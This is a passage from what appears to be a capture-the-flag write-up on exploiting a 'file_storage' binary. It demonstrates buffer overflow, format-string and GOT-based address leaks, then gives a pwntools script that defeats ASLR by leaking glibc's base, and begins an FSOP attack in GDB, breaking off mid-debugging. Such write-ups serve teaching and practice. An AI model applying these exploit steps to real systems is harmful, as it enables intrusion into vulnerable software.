<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">local_c);</span>
<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> local_c;</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="finding-vulnerabilities">Finding vulnerabilities</h3><p>Looking again at the <code>main</code> function, we have these vulnerabilities:</p><ul><li>It uses <code>gets</code> to take user input (data to write into a file).</li><li>There is an instruction <code>printf(path);</code> using as first argument a variable that is controlled by the user (the path of a file).</li><li>When reading a file, it asks whether it contains strings or a number. If the answer is a number, then the file is read as string and passed to <code>atoi</code>. After that, the number is passed directly to <code>puts</code>. This is vulnerable because <code>puts</code> will take this number as a pointer to a string.</li></ul><p>Let&rsquo;s test these vulnerabilities:</p><ul><li>Buffer Overflow in <code>gets</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 2
Enter content:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
zsh: segmentation fault (core dumped)  ./file_storage
</code></pre></div><ul><li>Format String vulnerability in <code>printf</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan"></span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: %p
Error: Only '.txt' files are allowed

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: %p.txt
Error: File not found. Please try again  
Debug: /tmp/0x7fffffffbfa0.txt
1. Read contents from a file
2. Write data into a random file
3. Exit
&gt;
</code></pre></div><p>Notice that the program checks the <code>.txt</code> extension of the filename.</p><ul><li>Memory leaks with <code>atoi</code> and <code>puts</code>:</li></ul><p>For this, let&rsquo;s enter a specific number into a file at <code>/tmp</code>. This number is the entry for <code>puts</code> at the GOT (or any other function):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -r <span class="mtku">file_storage</span> | <span class="code-dark-green">grep</span> puts
000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 <span class="code-red">puts</span>@GLIBC_2.2.5 + 0  

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print(0x404020)'</span>
4210720

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 4210720 &gt; /tmp/a.txt

<span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: a.txt
What's in the file? (string/number): number

Do you want to write something? (yes/no): no
Cleaning files...
</code></pre></div><p>We do not see anything because they are non-printable characters. Moreover, the files get deleted 5 seconds after showing the message <code>"Cleaning files..."</code>.</p><p>Let&rsquo;s use <code>xxd</code> to view the memory leak:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 4210720 &gt; /tmp/a.txt

<span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span> | <span class="code-dark-green">xxd</span>
00000000: 5765 6c63 6f6d 6520 746f 206d 7920 4669  Welcome to my Fi
00000010: 6c65 2053 746f 7261 6765 2028 6265 7461  le Storage (beta
00000020: 293a 0a0a 312e 2052 6561 6420 636f 6e74  ):..1. Read cont
00000030: 656e 7473 2066 726f 6d20 6120 6669 6c65  ents from a file
00000040: 0a32 2e20 5772 6974 6520 6461 7461 2069  .2. Write data i
00000050: 6e74 6f20 6120 7261 6e64 6f6d 2066 696c  nto a random fil
1
00000060: 650a 332e 2045 7869 740a 3e20 4669 6c65  e.3. Exit.&gt; File  
a.txt
00000070: 6e61 6d65 3a20 5768 6174 2773 2069 6e20  name: What's in
00000080: 7468 6520 6669 6c65 3f20 2873 7472 696e  the file? (strin
number
00000090: 672f 6e75 6d62 6572 293a 2020 14b3 96cf  g/number):  ....
000000a0: 7f0a 446f 2079 6f75 2077 616e 7420 746f  ..Do you want to
000000b0: 2077 7269 7465 2073 6f6d 6574 6869 6e67   write something
no
000000c0: 3f20 2879 6573 2f6e 6f29 3a20 436c 6561  ? (yes/no): Clea
000000d0: 6e69 6e67 2066 696c 6573 2e2e 2e0a       ning files....
</code></pre></div><p>There we have it: <code>20 14 b3 96 cf 7f</code>, or <code>0x7fcf96b31420</code> as a hexadecimal number. This is the address of <code>puts</code> at runtime, because is the value at the GOT entry for <code>puts</code> (<code>0x404020</code>). And the last three hexadecimal digits of the address match with the last three hexadecimal digits of its offset inside Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">' puts@@'</span>
   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15<span class="code-red"> puts@@</span>GLIBC_2.2.5  
</code></pre></div><h2 id="exploit-strategy">Exploit strategy</h2><p>Now, let&rsquo;s plan the exploitation strategy (locally). First of all, some considerations about the program:</p><ul><li>We cannot use a common Buffer Overflow exploit because there is no returning instruction in <code>main</code> (it executes <code>exit</code>).</li><li>We cannot fully exploit the Format String vulnerability because the size of our input is 8 bytes long (for the filename) and we need to enter <code>"txt"</code>.</li><li>The program allows to try filenames until we find a valid one or exit the program.</li><li>If we write data into a file, the program will exit afterwards.</li><li>The generated filename is random and consists of two capital letters (for example, <code>AB.txt</code> or <code>XD.txt</code>).</li><li>After showing <code>"Cleaning files..."</code>, the <code>.txt</code> files inside <code>/tmp</code> will be removed after 5 seconds.</li><li>If we read a file, we have a chance to write data into a file.</li></ul><p>Now, we can bypass some of these issues:</p><ul><li>We can enter data into a random file and exit the program before the deletion is done.</li><li>We can use brute force to find the generated filename (we could also forge the PRNG using <code>srand(time(0))</code> and <code>rand()</code>, but there can be synchronization issues).</li><li>We can close the process before the program removes the files.</li></ul><p>In order to bypass ASLR, the best idea is to put the address of a GOT entry into a file and, after that, read it as show-cased before. This way, we will get the address of a function inside Glibc at runtime, so that we can calculate the base address of Glibc.</p><p>Let&rsquo;s start with this Python script:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">pwn</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk5">*</span>

<span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk1">binary</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">elf</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'file_storage'</span><span class="mtk1">)</span>
<span class="mtk1">glibc</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">ELF</span><span class="mtk1">(</span><span class="mtk4">'libc.so.6'</span><span class="mtk1">, </span><span class="mtk9 mtki">checksec</span><span class="mtk5">=</span><span class="mtk6">False</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk8">process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk1">port</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">].</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">':'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">remote</span><span class="mtk1">(</span><span class="mtk1">host</span><span class="mtk1">, </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">port</span><span class="mtk1">))</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">filename_progress</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">progress</span><span class="mtk1">(</span><span class="mtk4">'Filename'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">a</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">string</span><span class="mtk1">.</span><span class="mtk1">ascii_uppercase</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">b</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">string</span><span class="mtk1">.</span><span class="mtk1">ascii_uppercase</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">filename</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">a</span><span class="mtk6">}{</span><span class="mtk1">b</span><span class="mtk6">}</span><span class="mtk4">.txt'</span>
<span class="mtk1">            </span><span class="mtk1">filename_progress</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Filename: '</span><span class="mtk1">, </span><span class="mtk1">filename</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">            </span><span class="mtk1">msg</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">p</span><span class="mtk1">.recvuntil(</span><span class="mtk7 mtki">b</span><span class="mtk4">':'</span><span class="mtk1">)</span>

<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'Error'</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">msg</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">filename_progress</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">filename</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">6</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'content:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.puts).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
<span class="mtk1">    </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">filename</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Filename: '</span><span class="mtk1">, </span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(string/number): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'number'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked puts() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.puts</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>Notice that we start the program and exit just to clean up files in <code>/tmp/??.txt</code>, just in case. Then, before closing the process, we can use <code>sleep(1)</code> to ensure that the file is written properly (otherwise, the next steps might crash):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1587036
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1587036)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1587095
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1587095)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1587097
[<span class="code-green">+</span>] Filename: OL.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1587097)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1587155
[<span class="code-blue">*</span>] Leaked puts() address: 0x7f4c4506e420
[<span class="code-green">+</span>] Glibc base address: 0x7f4c44fea000
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1587155)
</code></pre></div><p>Nice, let&rsquo;s review the code block that writes data into a file:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>

<span class="mtk1">  </span><span class="mtk3">// ...</span>

<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> content[</span><span class="mtk6">256</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> path[</span><span class="mtk6">16</span><span class="mtk1">];</span>
<span class="mtk1">  FILE </span><span class="mtk5">*</span><span class="mtk1">fp;</span>

<span class="mtk1">  </span><span class="mtk3">// ...</span>

<span class="mtk1">  </span><span class="mtk8">generate</span><span class="mtk1">(path);</span>
<span class="mtk1">  fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(path, </span><span class="mtk4">"w"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (fp </span><span class="mtk5">==</span><span class="mtk1"> (FILE </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"fopen() error"</span><span class="mtk1">);</span>
<span class="mtk3">                /* WARNING: Subroutine does not re</span><span class="mtk3">turn */</span>  
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Enter content:"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">gets</span><span class="mtk1">(content);</span>
<span class="mtk1">  </span><span class="mtk8">fprintf</span><span class="mtk1">(fp, </span><span class="mtk4">" </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, content);</span>
<span class="mtk1">  </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>

<span class="mtk1">  </span><span class="mtk3">// ...</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="fsop">FSOP</h3><p>Despite not being able to control the saved return address using the Buffer Overflow vulnerability, we can modify the value of the <code>FILE* fp</code> pointer, so that we can make <code>fprintf</code> write arbitrary data in a writeable segment of memory. This technique is called File Stream Oriented Programming (FSOP).</p><p>Let&rsquo;s use GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">file_storage</span>
Reading symbols from <span class="code-dark-green">file_storage</span>...
(No debugging symbols found in <span class="code-dark-green">file_storage</span>)
<span class="code-red">gef‚û§  </span>disassemble main
Dump of assembler code for function main:
   <span class="code-dark-blue">0x00000000004014a4</span> &lt;+0&gt;:     endbr64
   ...
   <span class="code-dark-blue">0x000000000040176a</span> &lt;+710&gt;:   call   <span class="code-dark-blue">0x401260</span> &lt;<span class="code-dark-yellow">gets@plt</span>&gt;
   <span class="code-dark-blue">0x000000000040176f</span> &lt;+715&gt;:   lea    rdx,[rbp-0x130]
   <span class="code-dark-blue">0x0000000000401776</span> &lt;+722&gt;:   mov    rax,QWORD PTR [rbp-0x10]
   <span class="code-dark-blue">0x000000000040177a</span> &lt;+726&gt;:   lea    rsi,[rip+0x9ad]        # <span class="code-dark-blue">0x40212e</span>
   <span class="code-dark-blue">0x0000000000401781</span> &lt;+733&gt;:   mov    rdi,rax
   <span class="code-dark-blue">0x0000000000401784</span> &lt;+736&gt;:   mov    eax,0x0
   <span class="code-dark-blue">0x0000000000401789</span> &lt;+741&gt;:   call   <span class="code-dark-blue">0x401240</span> &lt;<span class="code-dark-yellow">fprintf@plt</span>&gt;
   <span class="code-dark-blue">0x000000000040178e</span> &lt;+746&gt;:   mov    rax,QWORD PTR [rbp-0x10]
   <span class="code-dark-blue">0x0000000000401792</span> &lt;+750&gt;:   mov    rdi,rax
   <span class="code-dark-blue">0x0000000000401795</span> &lt;+753&gt;:   call   <span class="code-dark-blue">0x4011b0</span> &lt;<span class="code-dark-yellow">fclose@plt</span>&gt;
   <span class="code-dark-blue">0x000000000040179a</span> &lt;+758&gt;:   jmp    <span class="code-dark-blue">0x4017ab</span> &lt;<span class="code-dark-yellow">main</span>+775&gt;
   <span class="code-dark-blue">0x000000000040179c</span> &lt;+760&gt;:   lea    rdi,[rip+0xa04]        # <span class="code-dark-blue">0x4021a7</span>
   <span class="code-dark-blue">0x00000000004017a3</span> &lt;+767&gt;:   call   <span class="code-dark-blue">0x4011a0</span> &lt;<span class="code-dark-yellow">puts@plt</span>&gt;
   <span class="code-dark-blue">0x00000000004017a8</span> &lt;+772&gt;:   jmp    <span class="code-dark-blue">0x4017ab</span> &lt;<span class="code-dark-yellow">main</span>+775&gt;
   <span class="code-dark-blue">0x00000000004017aa</span> &lt;+774&gt;:   nop
   <span class="code-dark-blue">0x00000000004017ab</span> &lt;+775&gt;:   cmp    DWORD PTR [rbp-0x4],0x0
   <span class="code-dark-blue">0x00000000004017af</span> &lt;+779&gt;:   je     <span class="code-dark-blue">0x4014e4</span> &lt;<span class="code-dark-yellow">main</span>+64&gt;
   <span class="code-dark-blue">0x00000000004017b5</span> &lt;+785&gt;:   lea    rdi,[rip+0x9f0]        # <span class="code-dark-blue">0x4021ac</span>
   <span class="code-dark-blue">0x00000000004017bc</span> &lt;+792&gt;:   call   <span class="code-dark-blue">0x4011a0</span> &lt;<span class="code-dark-yellow">puts@plt</span>&gt;
   <span class="code-dark-blue">0x00000000004017c1</span> &lt;+797&gt;:   mov    edi,0x5
   <span class="code-dark-blue">0x00000000004017c6</span> &lt;+802&gt;:   call   <span class="code-dark-blue">0x4012c0</span> &lt;<span class="code-dark-yellow">sleep@plt</span>&gt;
   <span class="code-dark-blue">0x00000000004017cb</span> &lt;+807&gt;:   lea    rdi,[rip+0x9ec]        # <span class="code-dark-blue">0x4021be</span>
   <span class="code-dark-blue">0x00000000004017d2</span> &lt;+814&gt;:   call   <span class="code-dark-blue">0x4011e0</span> &lt;<span class="code-dark-yellow">system@plt</span>&gt;
   <span class="code-dark-blue">0x00000000004017d7</span> &lt;+819&gt;:   mov    edi,0x0
   <span class="code-dark-blue">0x00000000004017dc</span> &lt;+824&gt;:   call   <span class="code-dark-blue">0x4012b0</span> &lt;<span class="code-dark-yellow">exit@plt</span>&gt;
End of assembler dump.
<span class="code-red">gef‚û§  </span>break *main+741
Breakpoint 1 at <span class="code-dark-blue">0x401789</span>
<span class="code-red">gef‚û§  </span>pattern create 500
<span class="code-blue">[+]</span> Generating a pattern of 500 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa  
<span class="code-green">[+]</span> Saved as '$_gef0'
<span class="code-red">gef‚û§  </span>run
Starting program: ./file_storage
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 2
Enter content:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa

